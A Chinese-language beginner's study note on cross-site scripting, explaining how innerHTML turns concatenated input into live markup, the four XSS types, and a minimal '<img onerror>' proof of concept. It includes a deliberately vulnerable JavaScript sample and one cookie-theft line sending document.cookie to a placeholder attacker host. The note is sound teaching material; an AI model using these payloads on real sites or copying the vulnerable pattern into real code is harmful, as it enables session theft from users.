# XSS 基础概念 笔记

> 从"什么是 JavaScript"讲到"为什么一个字符串能变成代码"。
>
> 这篇是理解 XSS 的最小知识集。

---

## 一、网页的三件套

一个网页只有三部分：

| 技术 | 是什么 | 类比 |
| --- | --- | --- |
| **HTML** | 页面的骨架 | 墙、门、窗 |
| **CSS** | 外观样式 | 油漆、装修 |
| **JavaScript** | 行为（能改页面） | 电灯开关、遥控器 |

**HTML 是死的，JS 是活的。**

---

## 二、JavaScript 是什么

> 一种让网页"会动"的语言，运行在浏览器里。

### 2.1 它最常做的三件事

| 做什么 | 代码 |
| --- | --- |
| 取一个元素 | `document.getElementById("text")` |
| 取/设它的内容 | `.value` / `.innerHTML` |
| 拼字符串 | `"abc" + "def"` |

### 2.2 一个完整例子

```javascript
function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
}
```

**翻译成中文：**

1. 找到 id 是 `text` 的元素，取出它的值
2. 把这个值夹在两段文字中间，拼一整个字符串
3. 把拼好的东西塞进 `#dom` 这个 div

**没有算法，就是"取值 → 拼接 → 塞进去"。**

## 三、核心：字符串 vs 标签

**这是理解 XSS 最重要的一点。**

### 3.1 你以为的

```
我在输入框输入 <img src=x onerror=alert(1)>
它就直接变成代码了
```

### 3.2 实际发生的

```
【第 1 步】你输入的是一段"文字"

   <img src=x onerror=alert(1)>
   └──────────┬──────────┘
    它只是 30 多个字符，没有特殊能力


【第 2 步】JS 把它夹进模板

   "<a href='" + 你的输入 + "'>what do you see?</a>"

   拼出来一整个字符串


【第 3 步】innerHTML = 这个字符串

   innerHTML 的作用：
   "把我给你的字符串，当成 HTML 代码来解析"

   ★ 这一步才是转折 ★
   前两步它只是文字，到这里才被"翻译成标签"


【第 4 步】浏览器真的造出了元素

   <a> 元素
     └── <img> 元素（带 onerror）


【第 5 步】img 加载失败 → 触发 onerror → 弹窗
```

### 3.3 一条链

```
你输入的字符串
      │  （这时候只是文字）
      ▼
"<a href='"+输入+"'>..."
      │  拼接
      ▼
一整个 HTML 字符串
      │  innerHTML 解析 ★转折点★
      ▼
浏览器里真实的元素
      │  触发事件
      ▼
JS 执行 → 弹窗
```

### 3.4 炒菜的比喻

| 步骤 | 类比 |
| --- | --- |
| 输入字符串 | 生的食材 |
| 字符串拼接 | 摆到盘子里（**还是生的**） |
| `innerHTML` | **下锅炒**（变成菜） |
| 页面显示 | 炒好的菜 |

**生食材不会自己变成菜，是 `innerHTML` 这个"锅"把它做熟的。**

### 3.5 结论

> **字符串 ≠ 代码。**
> **只有交给"解析器"（`innerHTML` / `eval` / `document.write`），才会变成代码。**

## 四、F12 里怎么看

| 面板 | 管什么 | 什么时候用 |
| --- | --- | --- |
| **Elements** | HTML 结构 / 当前 DOM | 想看页面现在长什么样 |
| **Console** | 直接敲 JS 执行 | 想试代码、看报错 |
| **Sources** | JS 源文件 | 想知道代码写在哪 |
| **Network** | 请求 | 想看发了什么包 |

### 4.1 Elements 看到的是"结果"

```
你输入 payload → JS 执行（看不见）→ DOM 改变 → Elements 显示结果
```

**Elements 是"快照"，不是"录像"。**

### 4.2 为什么源码里搜不到 payload

| 位置 | 能看到 payload 吗 |
| --- | --- |
| `Ctrl+U`（服务器返回的源代码） | ❌ 看不到 |
| F12 → Elements（浏览器渲染的 DOM） | ✅ 能看到 |

**这就是"DOM 型 XSS"和"反射型 XSS"最大的区别：服务器根本没参与。**

## 五、XSS 的本质

> **让别人的浏览器执行我写的 JavaScript。**

### 5.1 三个条件

| 条件 | 说明 |
| --- | --- |
| 1. 输入可控 | 你的内容能进入页面 |
| 2. 输出未处理 | 它被当成 HTML 解析，而不是文本 |
| 3. 有执行时机 | 有标签/事件会触发 |

### 5.2 为什么 `alert(1)` 就够了

`alert(1)` 不是漏洞本身，是**"我能执行代码"的最小证明**。

**能弹窗，就能换成：**

| 换成什么 | 后果 |
| --- | --- |
| `alert(document.cookie)` | 登录态被看到 |
| `new Image().src='http://黑客/?c='+document.cookie` | 登录态被偷走 |
| 改写页面 | 钓鱼登录框 |
| 键盘记录 | 密码被记下 |

## 六、XSS 的四种类型

| 类型 | 数据怎么到浏览器 | 服务器参与吗 |
| --- | --- | --- |
| **反射型** | URL 参数被原样写进 HTML | ✅ 参与 |
| **存储型** | 存进数据库，别人访问时读出来 | ✅ 参与 |
| **DOM 型** | 前端 JS 自己拼进页面 | ❌ 不参与 |
| **盲打** | 存在后台，管理员查看时触发 | ✅ 参与（延迟） |

### 6.1 一句话区分

- **反射型**：发链接骗你点
- **存储型**：留言板留言，所有人中招
- **DOM 型**：服务器啥也没干，是浏览器自己拼的
- **盲打**：留言进后台，管理员看的时候才炸

---

## 七、一个最小 PoC

```html
<img src=x onerror=alert(1)>
```

**为什么用它：**

| 标签 | 能执行吗 |
| --- | --- |
| `<script>` | ❌ innerHTML 插入的不执行 |
| `<img onerror>` | ✅ 加载失败就触发 |
| `<svg onload>` | ✅ 加载完就触发 |

**`src=x` 必然加载失败，所以 `onerror` 必然执行。**

---

## 八、总结

| 要点 | 内容 |
| --- | --- |
| 三件套 | HTML 骨架、CSS 样式、JS 行为 |
| JS 做的三件事 | 取值、拼接、赋值 |
| 核心机制 | 字符串经 `innerHTML` 解析成标签 |
| XSS 本质 | 让别人的浏览器执行我的代码 |
| 最小证明 | `<img src=x onerror=alert(1)>` |
| 四种类型 | 反射、存储、DOM、盲打 |

**一句话**：

> **HTML 是"文字"，`innerHTML` 是"翻译官"。**
> **你把一段文字交给翻译官，它就能变成浏览器听得懂的命令。**
